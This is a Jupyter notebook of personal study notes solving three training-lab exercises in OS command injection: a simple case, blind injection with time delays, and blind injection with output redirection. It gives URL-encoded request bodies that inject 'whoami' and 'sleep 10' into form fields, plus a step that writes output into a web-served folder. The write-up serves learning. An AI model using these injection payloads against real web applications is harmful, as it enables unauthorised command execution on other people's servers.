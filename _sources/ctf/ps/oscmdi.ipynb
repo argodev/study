{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# OS Command Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## OS command injection, simple case\n",
    "\n",
    "```{admonition} Question\n",
    "This lab contains an OS command injection vulnerability in the product stock checker.\n",
    "\n",
    "The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.\n",
    "\n",
    "To solve the lab, execute the `whoami` command to determine the name of the current user.\n",
    "```\n",
    "\n",
    "This application issues a `POST` reequest to the `/product/stock` endpoint with the following expected payload: `productId=1&storeId=1`. With valid values, you receive something like `62` as the payload of the response.\n",
    "\n",
    "The instructions and page make it appear as though you simply change the values to `echo test` or something like `productId=& whoami &storeId=1` but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following:\n",
    "\n",
    "```text\n",
    "productId=%26%20echo%20george%20%26&storeId=whoami\n",
    "```\n",
    "\n",
    "Which gave me a return like this:\n",
    "\n",
    "```text\n",
    "george\n",
    "peter-tVfyfI\n",
    "```\n",
    "\n",
    "I'm *certain* there are other variations that will produce the right results."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "## Blind OS command injection with time delays\n",
    "\n",
    "```{admonition} Question\n",
    "This lab contains a blind OS command injection vulnerability in the feedback function.\n",
    "\n",
    "The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.\n",
    "\n",
    "To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.\n",
    "```\n",
    "\n",
    "I modified the request as follows (`& sleep 10 &`):\n",
    "\n",
    "```text\n",
    "csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26\n",
    "```\n",
    "\n",
    "This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) *both* the `email` and `subject` params need to have the sleep command, otherwise it simply returns immediately."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "## Blind OS command injection with output redirection\n",
    "\n",
    "```{admonition} Question\n",
    "This lab contains a blind OS command injection vulnerability in the feedback function.\n",
    "\n",
    "The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:\n",
    "\n",
    "`/var/www/images/`\n",
    "\n",
    "The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.\n",
    "\n",
    "To solve the lab, execute the `whoami` command and retrieve the output.\n",
    "```\n",
    "\n",
    "To solve this challenge, I crafted a string: `& whoami > /var/www/images/bubba &` and then fully URL-encoded it as `%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26`. \n",
    "\n",
    "Using the information from the prior challenge, I substituted my command payload in both the `email` and `subject` fields as such:\n",
    "\n",
    "```text\n",
    "csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test\n",
    "```\n",
    "\n",
    "And submitted it. I then found an image-returning request and modified the path to my newly-created file: `GET /image?filename=bubba HTTP/1.1` and I was presented with the currently running user: `peter-rYqzDj`\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 ('cogitation')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e5d901bd8d10d46218975e705a9e09a209b61b793036c302a5ef6447c4d4b056"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
